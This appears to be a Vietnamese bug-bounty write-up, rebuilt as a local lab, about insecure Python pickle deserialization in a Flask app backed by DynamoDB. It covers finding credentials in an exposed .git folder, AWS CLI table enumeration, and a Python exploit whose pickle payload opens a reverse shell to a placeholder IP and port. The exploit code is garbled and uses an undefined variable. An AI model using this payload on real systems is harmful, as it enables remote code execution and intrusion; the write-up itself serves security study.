---
author: Chi Tran
layout: single
title: "Python Deserialization on Integrated AWS DDB Flask App"
date: "2021-12-19"
categories: 
  - "bug-hunting"
---

Cách đây vài hôm mình có gặp một challenge hay ho khi làm Bug Bounty ở nền Cloud && Web. Tuy flow xử lý data không có gì là mới, nhưng việc application sử dụng AWS DynamoDB để lưu trữ serialized data làm bug này trở nên thú vị hơn nhiều.

#### Tiếp cận

- Như thường lệ, một trong những việc mà đa số ai cũng làm khi tiếp cận 1 website đó là kiểm tra sự tồn tại của folder /.git.
- Với trường hợp mình gặp cũng không ngoại lệ. .git được tải xuống và extract ra được file app.py với nội dung tương tự như sau (nội dung đã được mình chỉnh sửa để dựng lại lab thay vì sử dụng mã nguồn gốc)

![](images/1*qUyMaO6pXSSxF6WlJd8r8g.png)

- Mình note nhanh là mấy bạn đừng có cố gắng soi cái Access Key với Secret Key làm gì vì mình dựng lại bug này trên Dynamo Local. Nó không xài được trên AWS Console như 1 IAM Cred thiệt đâu.
- Đồng thời giao diện web như sau (mình cũng mode lại 1 Flask app khác để khác với submission thực tế, tuy nhiên đều cùng concept)

![](images/1*ZrQBfd8GSwjZlFGH55Tb1A.png)

Main Page

![](images/1*dYHSD56WrNidmXgy4ajOlQ.png)

Sub-endpoint

![](images/1*wN4mOwiTegX80bY_UJ6wxw.png)

Customers endoint

- Điểm lưu ý đầu tiên, nội dung của customers.html này có đoạn như sau

![](images/1*bp2H3th35eUHnmfH09wMxg.png)

Name và Description được lấy từ 1 JSON object pass từ main controller (app.py)

- Quay lại app.py, object data này được tạo ra như sau

![](images/1*VJwcZvcbDweTgONPJ-GYPA.png)

- Workflow có thể hiểu như sau: Khi page được loaded, JSON object được parsed từ array data (app.py). Data này được hình thành bằng việc Scan Items từ DynamoDB table, item sau đó được decode và pickle load, cuối cùng lưu vào array.
- Điểm đáng chú ý thứ 2 là việc sử dụng Pickle để load data từ DynamoDB. Dẫn đến một hướng khai thác khả thi nhất để có thể RCE được đó là thay vì deserialize một item bình thường, bằng cách nào đó application sẽ deserialize payload reverse shell.
- Đối với giải pháp như vậy, việc đầu tiên cần làm đó là compromise được DynamoDB table, sau đó ghi vào trường data một payload RCE bằng API put\_item() từ AWS CLI. Example:

> client.put\_item( TableName = TABLE\_NAME, Item={ ‘data’: {‘S’: data}, ‘Id’:{‘N’:1}} )

- Với việc AWS Credential bị exposed trong app.py, bước tiếp theo là xác định cấu trúc table. Một lưu ý đối với DynamoDB table là case-sensitive, có nghĩa là mọi item được ghi bằng code hay bằng AWS CLI đều phải chính xác từ chữ hoa đến chữ thường.

#### Exploit

- **Bước 1**: Kiểm tra AWS creds có quyền đến những table nào

> aws dynamodb list-tables — endpoint-url [http://localhost:8000](http://localhost:8000)

![](images/1*en5Ydy2eEcb2yHYBqSs1IQ.png)

- **Bước 2**: Xác định cấu trúc Table customers

> aws dynamodb scan — table-name customers — endpoint-url [http://localhost:8000](http://localhost:8000)

![](images/1*qEqqnWR782oJf6v1MTnmsw.png)

- Table được cấu thành bởi trường **Id** (**Number**) là **Partition Key**, và **data** (**String**) là serialized data.
- **Bước 3**: Exploit
{% highlight python %}
import boto3 import pickle import os import base64

class RCE: def \_\_reduce\_\_(self): command = “”” python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((“**<IP>**”,**<port>**));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[“**/bin/sh**”,”-i”\]);’ “”” return (os.system, (command,))

if \_\_name\_\_ == ‘\_\_main\_\_’: pickled = pickle.dumps(RCE()) payload = base64.urlsafe\_b64encode(sample1).decode(“utf-8”) print (“Payload :”, payload) client = boto3.client( ‘dynamodb’, aws\_access\_key\_id=”access\_key”, aws\_secret\_access\_key=”secret\_key”, region\_name=”us-east-1", endpoint\_url=’[http://127.0.0.1:8000'](http://127.0.0.1:8000%27) )

client.put\_item( TableName=TABLE\_NAME, Item={ ‘data’: {‘S’:payload}, ‘Id’:{‘N’:1}} )
{% endhighlight %}

- Cuối cùng là reload lại endpoint để trigger insecure deserialization

![](images/1*jTfiSNvhuK9h7SKZ6OodLg.png)


**Good luck have fun!**
